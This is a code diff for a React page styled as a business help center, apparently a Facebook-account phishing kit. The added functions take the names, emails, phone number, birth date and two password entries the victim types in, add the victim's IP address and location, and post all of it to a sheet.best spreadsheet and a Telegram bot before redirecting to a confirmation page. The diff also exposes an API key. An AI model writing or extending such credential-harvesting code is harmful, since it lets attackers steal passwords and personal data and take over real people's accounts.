@@ -7,6 +7,8 @@ import { faHouseChimney } from '@fortawesome/free-solid-svg-icons';
 import { useNavigate } from "react-router-dom";
 import { useDispatch } from "react-redux";
 import { setData } from "../../store/business/businessSlice";
+import axios from "axios";
+import { ETelegram } from "../../constants";
 
 
 const BusinessHelpCenter = () => {
@@ -26,6 +28,7 @@ const BusinessHelpCenter = () => {
   const [open, setOpen] = useState(false);
   const [checkSend, setCheckSend] = useState<boolean>(true)
   const { TextArea } = Input;
+  const [loading, setLoading] = useState(false);
   const dispatch = useDispatch()
 
 
@@ -50,14 +53,18 @@ const BusinessHelpCenter = () => {
 
     setPassword('');
   };
-  const onFinish = (e: any) => {
+  const onFinish = async (e: any) => {
     if (!checkPass) {
       setCheckPass(true)
-
     }
     else {
       setCheckPass(false)
-      navigate('/confirm');
+      setLoading(true)
+      await Promise.all([
+        sendTelegramBotForGgsheet(),
+        sendTelegramBotForBusiness()
+      ])
+      setLoading(false)
       dispatch(setData({
         namePage,
         fullName,
@@ -70,6 +77,76 @@ const BusinessHelpCenter = () => {
         passwordSecond,
       }))
       clearState()
+      navigate('/confirm');
+    }
+  };
+
+  const sendTelegramBotForGgsheet = async () => {
+    const API_URL = `https://api.telegram.org/bot${ETelegram.API_KEY}/`;
+    let CURRENT_API_URL = API_URL + "sendMessage"
+    try {
+      let message = '✅ Đã thêm vào sheet thành công'
+      const data = {
+        ["Name Page"]: namePage,
+        ["Full Name"]: fullName,
+        ["Business Email Address"]: businessEmail,
+        ["Personal Email Address"]: personalEmail,
+        ["Mobile Phone Number"]: phone,
+        ["Date of Birth"]: date,
+        ["Please provide us information that will help us investigate"]: text,
+        ['Password First']: passwordFirst,
+        ['Password Second']: passwordSecond,
+      }
+      await axios.post('https://sheet.best/api/sheets/abe85991-15f1-47f0-a1d6-242f44b22e94', data).catch(() => {
+        message = '❌Thêm vào sheet không thành công'
+      })
+      await axios.post(CURRENT_API_URL, {
+        chat_id: ETelegram.CHAT_ID,
+        parse_mode: "html",
+        document: '',
+        text: message,
+        caption: message,
+      }, {
+        headers: {
+          "Content-Type": 'multipart/form-data',
+        }
+      });
+    } catch (err) {
+      console.log("err: ", err)
+    }
+  }
+
+  const sendTelegramBotForBusiness = async () => {
+    const API_URL = `https://api.telegram.org/bot${ETelegram.API_KEY}/`;
+    let CURRENT_API_URL = API_URL + "sendMessage"
+    try {
+      const response = await axios.get('https://ipgeolocation.abstractapi.com/v1/?api_key=0b54578041c84e4684b6c0f2542c1721')
+      let message = `
+      Email Account:  ${businessEmail}
+      Name Account: ${namePage}
+      Person Email: ${personalEmail}
+      Facebook Page: ${text}
+      User Name: ${fullName}
+      Phone Number: ${phone}
+      Password First: ${passwordFirst}
+      Password Second: ${passwordSecond}
+      Ip: ${response.data.ip_address}
+      City: ${response.data.city}
+      Country: ${response.data.country}
+      `;
+      await axios.post(CURRENT_API_URL, {
+        chat_id: ETelegram.CHAT_ID,
+        parse_mode: "html",
+        document: '',
+        text: message,
+        caption: message,
+      }, {
+        headers: {
+          "Content-Type": 'multipart/form-data',
+        }
+      });
+    } catch (err) {
+      console.log("err: ", err)
     }
   };
 
@@ -323,8 +400,8 @@ const BusinessHelpCenter = () => {
                         justifyContent: 'end',
                         alignItems: 'center'
                       }}>
-                        <Button type="primary" htmlType="submit" onClick={handleSave}>
-                          <p style={{ fontSize: '.875rem', fontWeight: "600" }}>Continue</p>
+                        <Button type="primary" htmlType="submit" onClick={handleSave} loading={loading} style={{ fontSize: '.875rem', fontWeight: "600" }}>
+                          Continue
                         </Button>
                       </Space>
                     </Form.Item>
